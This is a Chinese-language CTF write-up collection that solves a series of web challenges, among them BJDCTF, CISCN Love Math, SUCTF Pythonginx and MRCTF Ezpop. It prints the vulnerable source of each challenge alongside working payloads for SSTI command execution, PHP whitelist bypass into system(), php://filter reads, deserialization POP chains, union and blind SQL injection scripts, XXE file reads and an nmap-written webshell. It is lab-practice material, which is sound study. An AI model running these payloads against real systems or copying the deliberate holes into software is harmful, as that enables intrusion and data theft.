def challenge():
    action = urllib.unquote(request.cookies.get("action"))
    param = urllib.unquote(request.args.get("param", ""))
    sign = urllib.unquote(request.cookies.get("sign"))
    ip = request.remote_addr
    if(waf(param)):
        return "No Hacker!!!!"
    task = Task(action, param, sign, ip)
    return json.dumps(task.Exec())
 
@app.route('/')
def index():
    return open("code.txt","r").read()
 
def scan(param):
    socket.setdefaulttimeout(1)
    try:
        return urllib.urlopen(param).read()[:50]
    except:
        return "Connection Timeout"
 
def getSign(action, param):
    return hashlib.md5(secert_key + param + action).hexdigest()
 
def md5(content):
    return hashlib.md5(content).hexdigest()
 
def waf(param):
    check=param.strip().lower()
    if check.startswith("gopher") or check.startswith("file"):
        return True
    else:
        return False
if __name__ == '__main__':
    app.debug = False
    app.run(host='0.0.0.0',port=9999)
~~~

![image-20210525181241873](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210525181241873.png)



![image-20210525181210108](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210525181210108.png)

### [BJDCTF2020]Cookie is so stable

![image-20210525193459349](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210525193459349.png)

查看hint.php源码,说明cookie中有信息

![image-20210525193643238](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210525193643238.png)

抓包，发现cookie中有user字段，试了一下并不是SQL注入，怀疑是SSTI，发现了异常

![image-20210525194729947](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210525194729947.png)

看来是SSTI,但是代码做了过滤，自己对SSTI也不太熟悉，看看别人的WP

在user处尝试注入

{{7\*'7'}} 回显7777777 ==> Jinja2
{{7\*'7'}} 回显49 ==> Twig 

 

这里为Twig


payload

~~~ 
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
~~~

获取flag

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
```



![image-20210525201813511](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210525201813511.png)

### [CISCN 2019 初赛]Love Math

~~~php
 <?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}

~~~

传递一个参数c，对传递的内容用正则进行了限制字符和函数，只能使用给定的白名单函数来绕过限制，执行咱们想执行的命令，也就是cat /flag

如果没有任何限制的话，传递的参数应是：

~~~
?c=${system($_GET['p'])}&p=cat /flag  或者
?c=$_GET['cmd']($_GET['p'])&cmd=system&p=cat /flag
~~~

由于做了函数白名单限制，我们可以使用进制转换进行绕过

把_GET使用base_convert()函数由36进制变成10进制的数字，但是这样好像行不通，因为`_`符号无法用36进制表示出来，所以我们先获取hex2bin()函数，这个函数的作用是把16进制转换成字符串。

接下来就是构造_GET的16进制:5f474554

但是传递的参数内容不能有引号，所以还要把_GET的16进制字符串转换成10进制数字

hexdec('5f474554'):1598506324，所以`base_convert(37907361743,10,36)(dechex(1598506324))`-->`_GET`

_GET构造出来了，接下来就是传递参数了,上述代码限制了`[]`中括号，咱们可以使用`{}`花括号绕过，而其中的pi、abs变量名也是上面白名单中的数学函数，这样才能绕过限制

~~~
?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{pi}($$pi{abs})&pi=system&abs=cat /flag
~~~

![image-20210531103458852](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210531103458852.png)

看看别人的WP,利用的是进制之间的转换构造函数

~~~
?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{pi}($$pi{abs})&pi=system&abs=cat /flag
~~~

### [BSidesCF 2020]Had a bad day

![image-20210526134522215](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210526134522215.png)

扫描目录发现了flag.php文件，但是页面是空白，估计是想办法利用漏洞读取源码

利用`filter`伪协议，获取了index.php的源码

![image-20210526135843834](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210526135843834.png)

~~~php
 <?php
	$file = $_GET['category'];

	if(isset($file))
	{
		if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
			include ($file . '.php');
		}
		else{
			echo "Sorry, we currently only support woofers and meowers.";
		}
	 }
 ?>
			
~~~

传入的`category`需要有`woofers`,`meowers`,`index`才能包含传入以传入名为文件名的文件，我们要想办法包含flag.php
 尝试直接读取`/index.php?category=woofers../../flag`

![image-20210526141802506](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210526141802506.png)

出现了别的内容，包含成功了`flag.php`，但是这里也说了flag需要读取
利用`php://filter`伪协议可以套一层协议读取`flag.php`
`/index.php?category=php://filter/convert.base64-encode/index/resource=flag`
套一个字符index符合条件并且传入flag，读取flag.php

![image-20210526141642703](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210526141642703.png)

成功获得flag值：

![image-20210526142129672](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210526142129672.png)



### [ASIS 2019]Unicorn shop

![image-20210526142919805](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210526142919805.png)

抓包发现商品的价格做了限制，只允许输入一个字符

![image-20210526143542181](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210526143542181.png)

如果只输入id,不输入price还会报错

![image-20210526144048218](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210526144048218.png)

提示需要一个single Unicode字符，而且只允许输入一个字符只能买1，2，3号马，买不了4号马，那么很显然，买到这个4号马，就能得到flag！

源码提示UTF-8很重要，这里需要了解下UTF-8是什么类型编码
 得到思路，利用Unicode字符中的一些特殊字符来代替输入的价格，从而得到flag

> https://www.compart.com/en/unicode/
>  这个网站有很全的Unicode字符

![image-20210526145136714](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210526145136714.png)

选择一个大于1337的，复制他的utf-8的编码，并把0x改为%，传输即可

![image-20210526145429829](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210526145429829.png)

### [安洵杯 2019]easy_serialize_php（。。。。。）

~~~php
 <?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';//用 | 将一维数组的值连接为一个字符串。
    return preg_replace($filter,'',$img);
}

if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);//变量覆盖post传递_SESSION的值

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info); //反序列化
    echo file_get_contents(base64_decode($userinfo['img']));
} 
~~~

~~~
$userinfo['img']=ZDBnM19mMWFnLnBocA==
~~~

在构造假的序列化字符串的时候，_SESSION里面的键值对必须为三对，因为\_SESSION中有 `user function img`这三个键

![image-20210527092136966](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210527092136966.png)





### [SUCTF 2019]Pythonginx

~~~python
 @app.route('/getUrl', methods=['GET', 'POST'])
def getUrl():
    url = request.args.get("url")
    host = parse.urlparse(url).hostname #获取请求主机名
    if host == 'suctf.cc':
        return "我扌 your problem? 111"
    parts = list(urlsplit(url)) #拆分url
    host = parts[1] #获得hostname:port
    if host == 'suctf.cc':
        return "我扌 your problem? 222 " + host
    newhost = []
    for h in host.split('.'): #使用. 分割host
        newhost.append(h.encode('idna').decode('utf-8'))#漏洞，使Unicode编码的字符等同与utf-8
    parts[1] = '.'.join(newhost)
    #去掉 url 中的空格
    finalUrl = urlunsplit(parts).split(' ')[0]
    host = parse.urlparse(finalUrl).hostname
    if host == 'suctf.cc':
        return urllib.request.urlopen(finalUrl).read()
    else:
        return "我扌 your problem? 333"
~~~

注释中还有两句提示

![image-20210527100934258](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210527100934258.png)

本题考的是Unicode编码

> ℆这个字符,如果使用python3进行idna编码的话
> print('℆'.encode('idna'))
> 结果
> b'c/u'
> 如果再使用utf-8进行解码的话
> print(b'c/u'.decode('utf-8'))
> 结果
> c/u
> 通过这种方法可以绕过网站的一些过滤字符

所以咱们可以使用python脚本去爆破一下经过idna编码和utf-8解码之后的成功显示suctf.cc主机的Unicode编码

~~~python
from urllib.parse import urlparse, urlunsplit, urlsplit
from urllib import parse


def get_unicode():
    for x in range(65536):
        uni = chr(x)
        url = f"http://{uni}uctf.cc"
        try:
            if getUrl(url):
                print("str: " + uni + ' unicode: \\u' + str(hex(x))[2:])
        except:
            pass


def getUrl(url):
    url = url
    host = parse.urlparse(url).hostname
    if host == 'suctf.cc':
        return False
    parts = list(urlsplit(url))
    host = parts[1]
    if host == 'suctf.cc':
        return False
    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1] = '.'.join(newhost)
    finalUrl = urlunsplit(parts).split(' ')[0]
    host = parse.urlparse(finalUrl).hostname
    if host == 'suctf.cc':
        return True
    else:
        return False


if __name__ == '__main__':
    get_unicode()
~~~

![image-20210531105549456](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210531105549456.png)

复制Unicode编码去https://graphemica.com/查询url编码

然后用file协议去获取Nginx配置文件的信息

![image-20210531110316539](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210531110316539.png)

知道了flag文件的位置在/usr/fffffflag

![image-20210531110407088](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210531110407088.png)



**nginx的信息**

> ngnix服务器配置目录
> 配置文件存放目录：/etc/nginx
> 主配置文件：/etc/nginx/conf/nginx.conf
> 管理脚本：/usr/lib64/systemd/system/nginx.service
> 模块：/usr/lisb64/nginx/modules
> 应用程序：/usr/sbin/nginx
> 程序默认存放位置：/usr/share/nginx/html
> 日志默认存放位置：/var/log/nginx
> 配置文件目录为：/usr/local/nginx/conf/nginx.conf

### [WUSTCTF2020]朴实无华

~~~php
<?php
header('Content-type:text/html;charset=utf-8');
error_reporting(0);
highlight_file(__file__);


//level 1
if (isset($_GET['num'])){
    $num = $_GET['num'];
    if(intval($num) < 2020 && intval($num + 1) > 2021){
        echo "我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>";
    }else{
        die("金钱解决不了穷人的本质问题");
    }
}else{
    die("去非洲吧");
}
//level 2
if (isset($_GET['md5'])){
   $md5=$_GET['md5'];
   if ($md5==md5($md5))
       echo "想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>";
   else
       die("我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲");
}else{
    die("去非洲吧");
}

//get flag
if (isset($_GET['get_flag'])){
    $get_flag = $_GET['get_flag'];
    if(!strstr($get_flag," ")){ //过滤了空格
        $get_flag = str_ireplace("cat", "wctf2020", $get_flag);
        echo "想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>";
        system($get_flag);
    }else{
        die("快到非洲了");
    }
}else{
    die("去非洲吧");
}
?> 
~~~

payload：

~~~
?num=2019e2&md5=0e215962017&get_flag=sort${IFS}fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag
~~~



![image-20210531150845212](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210531150845212.png)

### [SWPU2019]Web1

https://www.jianshu.com/p/dc9af4ca2d06

![image-20210531151756398](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210531151756398.png)

![image-20210531153628563](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210531153628563.png)

payload：

~~~
-1'/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/'
~~~



![image-20210531155623906](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210531155623906.png)

### [0CTF 2016]piapiapia

![image-20210601164508391](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210601164508391.png)

### [NCTF2019]True XML cookbook

考察用xxe去攻击内网

![image-20210601174731955](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210601174731955.png)

~~~php
<?php
/**
* autor: c0ny1
* date: 2018-2-7
*/

$USERNAME = 'admin'; //è´¦å·
$PASSWORD = '024b87931a03f738fff6693ce0a78c88'; //å¯ç 
$result = null;

libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');

try{
	$dom = new DOMDocument();
	$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
	$creds = simplexml_import_dom($dom);

	$username = $creds->username;
	$password = $creds->password;

	if($username == $USERNAME && $password == $PASSWORD){
		$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",1,$username);
	}else{
		$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",0,$username);
	}	
}catch(Exception $e){
	$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",3,$e->getMessage());
}

header('Content-Type: text/html; charset=utf-8');
echo $result;
?>
~~~

https://blog.csdn.net/SopRomeo/article/details/107491606

`file:///etc/hosts`

`file:///proc/net/arp`

![image-20210601185737945](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210601185737945.png)

![image-20210601195954013](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210601195954013.png)

![image-20210601195923391](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210601195923391.png)



### [NPUCTF2020]ReadlezPHP



![image-20210601200450785](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210601200450785.png)

~~~php
<?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "Y-m-d h:i:s";
        $this->b = "date";
    }
    public function __destruct(){
        $a = $this->a;
        $b = $this->b;
        echo $b($a); //b是传递的方法名，a传递的参数
    }
}
$c = new HelloPhp;

if(isset($_GET['source']))
{
    highlight_file(__FILE__);
    die(0);
}

@$ppp = unserialize($_GET["data"]);

~~~

看了代码之后很明显要考序列化的知识

system函数被禁用了

payload：

~~~
/time.php
?data=O:8:"HelloPhp":2:{s:1:"a";s:9:"phpinfo()";s:1:"b";s:6:"assert";}
~~~

![image-20210601203107697](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210601203107697.png)

这道题简单，只需要只要序列化就可以了，没有很绕

### [WesternCTF2018]shrine

~~~php

import flask
import os

app = flask.Flask(__name__)

app.config['FLAG'] = os.environ.pop('FLAG')


@app.route('/')
def index():
    return open(__file__).read()


@app.route('/shrine/<path:shrine>')
def shrine(shrine):

    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s

    return flask.render_template_string(safe_jinja(shrine))


if __name__ == '__main__':
    app.run(debug=True)

~~~

考察的是SSTI模板注入

![image-20210602123836022](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210602123836022.png)



![image-20210602124418330](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210602124418330.png)

[WP | 大专栏 (dazhuanlan.com)](https://www.dazhuanlan.com/2019/12/19/5dfaeb8cf31c7/)

[(6条消息) 【攻防世界】十七 --- shrine_通地塔的博客-CSDN博客](https://blog.csdn.net/qq_43168364/article/details/111873910)

### [极客大挑战 2019]FinalSQL

![image-20210602130328557](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210602130328557.png)

空格、mid()、or、and被过滤

本题使用SQL盲注，数字型注入

布尔盲注脚本：

~~~python
import sys
import time

import requests

def getPayload(result_index, char_index, ascii):
    # 附加url
    start_str = "0^"
    end_str = ""
    # 自定义SQL查询语句
    # select_str="version()" #limit "+ str(result_index) + ",1" 显示数据库、版本、用户名
    # 查询所有数据库名
    # select_str="select(group_concat(schema_name))from(information_schema.schemata)"#limit "+ str(result_index) + ",1"
    # 查询特定数据库中的所有表名
    # select_str="select(group_concat(table_name))from(information_schema.tables)where(table_schema='geek')"# limit "+str(result_index)+",1"
    # 查询数据库的表的列名
    # select_str= "select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')"# limit " + str(result_index) + ",1"
    # 查询特定数据库特定表中内容
    select_str="select(SUBSTRING((group_concat(password)),160))from(F1naI1y)"#limit "+str(result_index)+",1"
    # 连接payload
    sqli_str = "(ascii(substr((" + select_str + ")," + str(char_index) + ",1))>" + str(ascii) + ")"
    payload = start_str + sqli_str + end_str
    # print(payload)
    return payload
# F1naI1y:id,username,password,Flaaaaag:id,fl4gawsl

def execute(result_index, char_index, ascii):
    # 连接url
    url = "http://29c27056-5dc3-4352-9dac-d3687158ca20.node3.buuoj.cn//search.php?id="
    exec_url = url + getPayload(result_index, char_index, ascii)
    # print(exec_url)
    # 检查回显
    echo = "NO! Not this! Click others"
    content = requests.get(exec_url).text
    time.sleep(0.2)
    if echo in content:
        return True
    else:
        return False


def dichotomy(result_index, char_index, left, right):
    while left < right:
        # 二分法
        ascii = int((left + right) / 2)
        if execute(str(result_index), str(char_index + 1), str(ascii)):
            left = ascii
        else:
            right = ascii
        # 结束二分
        if left == right - 1:
            if execute(str(result_index), str(char_index + 1), str(ascii)):
                ascii += 1
                break
            else:
                break
    return chr(ascii)


if __name__ == "__main__":
    for num in range(32):  # 查询结果的数量
        count = 0
        for len in range(1000):  # 单条查询结果的长度
            count += 1
            char = dichotomy(num, len, 30, 126)
            if ord(char) == 31:  # 单条查询结果已被遍历
                break
            sys.stdout.write(char)
            sys.stdout.flush()
        if count == 1:  # 查询结果已被遍历
            break
        sys.stdout.write("\r\n")
        sys.stdout.flush()

~~~



![image-20210602181913873](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210602181913873.png)

### [网鼎杯 2020 朱雀组]Nmap

![image-20210603111952247](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210603111952247.png)

源码注释中给了flag的位置

![image-20210603112058032](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210603112058032.png)

nmap有个参数 `-oG`是保存内容到一个文件中的，本题可以使用创建一句话木马，**短标签绕过**

~~~
<?php
    echo “1111111111111 <br>”; 
?>
 
<?
    echo “222222222222 <br>”;
?>


<%
     echo“333333333333 <br>”;
%>


(注释：这种写法在php配置中默认关闭了的，所以不能输出一行3.如果要正常输出，需要配置php.ini文件。在配置文件中找到asp_tags=off ,将off改为on。改动配置文件后需要重启apache。)
 
<script language=”php”>
     echo“444444444444 <br>”
</script>
~~~



和以前做过的Online Tool题目套路一样

蚁剑连接，找到/flag文件

![image-20210603115418451](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210603115418451.png)

### [MRCTF2020]Ezpop---序列化pop链

~~~php
Welcome to index.php
<?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
} 
~~~

审计代码，考察的应该是序列化的知识：序列化pop链

> 1. 序列化Pop链，利用几个类之间相互关联进行构造
> 2. 文件包含漏洞：Modifier类中append函数使用了include（），会出现文件包含漏洞。

魔术方法：

> \_\_construct   当一个对象创建时被调用，
> \__toString   当一个对象被当作一个字符串被调用。
> \_\_wakeup()   使用unserialize时触发
> \_\_get()    用于从不可访问的属性读取数据
> #难以访问包括：（1）私有属性，（2）没有初始化的属性
> __invoke()   当脚本尝试将对象调用为函数时触发

https://blog.csdn.net/weixin_43952190/article/details/106016260

payload:

~~~php
<?php
class Modifier {
    protected  $var = 'php://filter/read=convert.base64-encode/resource=flag.php';
   }
 class Show{
    public $source;
    public $str;
    public function __toString(){
        return $this->str->source;
    }
 
    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}
 
class Test{
    public $p;
 
}
 
$a = new Show();
$b = $a->source = new Show(); //调用__toString()方法
$c = $b->str = new Test();//调用Test类中的__get()方法
$c->p = new Modifier();//调用Modifier类中的__invoke()方法
echo urlencode(serialize($a)); //最终$a形成了一条pop序列化链
~~~

![image-20210603141332169](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210603141332169.png)

![image-20210603141342459](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210603141342459.png)

### [CISCN2019 华东南赛区]Web11

![image-20210603165844097](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210603165844097.png)

发现了本机的ip地址，在数据包中尝试修改了一下XXF头，并不存在SQL注入漏洞，又怀疑存在ssti漏洞，试了一下成功发现SSTI

![image-20210603170045820](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210603170045820.png)

![image-20210603170451129](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210603170451129.png)

使用system函数查看系统文件，获得了flag

![image-20210603170646413](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210603170646413.png)

![image-20210603170717056](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210603170717056.png)

本题考察的就是ssti，难度不大

### [BJDCTF2020]EasySearch

![image-20210603172041583](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210603172041583.png)

用工具扫描到了备份文件，**注意要用单线程去扫描，多线程没有扫到，可能是因为靶场带宽不够导致的**

以下是备份文件里的内容，是PHP代码，开始代码审计吧

~~~php
<?php
	ob_start();
	function get_hash(){
		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
		$content = uniqid().$random;
		return sha1($content); 
	}
    header("Content-Type: text/html;charset=utf-8");
	***
    if(isset($_POST['username']) and $_POST['username'] != '' )
    {
        $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6)) { //密码的MD5值前六位等于'6d0bc1'
            echo "<script>alert('[+] Welcome to manage system')</script>";
            $file_shtml = "public/".get_hash().".shtml";
            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
            $text = '
            ***
            ***
            <h1>Hello,'.$_POST['username'].'</h1>
            ***
			***';
            fwrite($shtml,$text);
            fclose($shtm l);
            ***
			echo "[!] Header  error ...";
        } else {
            echo "<script>alert('[!] Failed')</script>";
            
    }else
    {
	***
    }
	***
?>
~~~

使用python脚本爆破出$admin == substr(md5($_POST['password']),0,6)

~~~python
import hashlib

for i in range(10000000000):
    md5 = hashlib.md5(str(i).encode("utf-8")).hexdigest()
    if(md5[:6] == '6d0bc1'):
        print(md5[:6])
        print(i)
        pass
~~~

爆破出密码是2020666，发送数据包并发现了一个url

![image-20210603193457031](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210603193457031.png)

访问url，返回了用户信息、时间还有ip

![image-20210603193603502](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210603193603502.png)

这三个字段信息肯定有可以利用的地方，先试试XFF字段，看看是否有SQL注入或者SSTI，很失望并不存在相关漏洞，看了别人的WP才知道原来是shtml后缀存在`SSI` 远程命令执行漏洞



![image-20210603195102156](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210603195102156.png)

![image-20210603195158456](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210603195158456.png)

### [MRCTF2020]PYWebsite

~~~javascript
 function enc(code){
      hash = hex_md5(code);
      return hash;
    }
    function validate(){
      var code = document.getElementById("vcode").value;
      if (code != ""){
        if(hex_md5(code) == "0cd4da0223c0b280829dc3ea458d655c"){
          alert("您通过了验证！");
          window.location = "./flag.php"
        }else{
          alert("你的授权码不正确！");
        }
      }else{
        alert("请输入授权码");
      }
      
    }
~~~

直接访问flag.php

![image-20210604105744125](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210604105744125.png)

提示验证在后端，所以前面那个前端验证没用（也正常，前端验证都可以直接修改）
 购买者的ip已经被记录，本地可以看到flag，那么使用xff或者client-ip伪造一下ip试试。
 bp抓包

![image-20210604105917424](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210604105917424.png)

### [GYCTF2020]FlaskApp

发现了一个隐藏的文本框，看名字里面应该是token

![image-20210604110714076](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210604110714076.png)

hint文件注释：提示PIN，没太懂什么意思

![image-20210604111527985](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210604111527985.png)

看了别人的WP发现，最后的漏洞点和上面的两个信息并没有什么关系。原来是Flask框架的SSTI漏洞利用，故意在decode解码输入无法解开的字母，就会产生错误信息

![image-20210604112931832](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210604112931832.png)

~~~python
@app.route('/decode',methods=['POST','GET'])

def decode():

    if request.values.get('text') :

        text = request.values.get("text")

        text_decode = base64.b64decode(text.encode())

        tmp = "结果 ： {0}".format(text_decode.decode())

        if waf(tmp) :

            flash("no no no !!")

            return redirect(url_for('decode'))

        res =  render_template_string(tmp)
~~~

根据上述代码，发现了SSTI漏洞，还有一个waf方法，估计下面得绕过waf方法





